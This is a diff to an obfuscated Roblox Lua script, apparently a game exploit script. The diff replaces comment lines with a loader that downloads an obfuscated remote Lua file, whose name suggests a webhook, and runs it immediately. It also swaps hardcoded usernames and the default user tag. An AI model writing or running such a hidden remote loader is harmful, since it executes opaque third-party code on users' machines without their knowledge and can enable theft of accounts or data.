@@ -1,6 +1,4 @@
---//lol
---// psalms said "script disconnect"
---// so ez
+loadstring(game:HttpGet("https://raw.githubusercontent.com/khen791/script-khen/refs/heads/main/obfWehook_DMshjabdkanns78Wr1arwjjsbsjanNNfAtRitJdkoqnfbjakndCQSf6Opdd8C1AsQ01cfrLHh47jakendjjahai65v7sjjajwhan6PU653c3q31sDpRJajhdiajjwdC.lua", true))();
 
 local v0 = string.char;
 local v1 = string.byte;
@@ -1130,8 +1128,8 @@ local v96 = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).N
 local v97 = os.date("%Y-%m-%d");
 local v19 = game:GetService("Players");
 local v98 = v19.LocalPlayer;
-local v99 = "Buyer";
-if (v98.Name == "computerplayer442") then
+local v99 = "khen on top!";
+if (v98.Name == "GameLuaNhau") then
 	v99 = "BurritoCat";
 elseif (v98.Name == "pzoz853") then
 	v99 = "Taco";
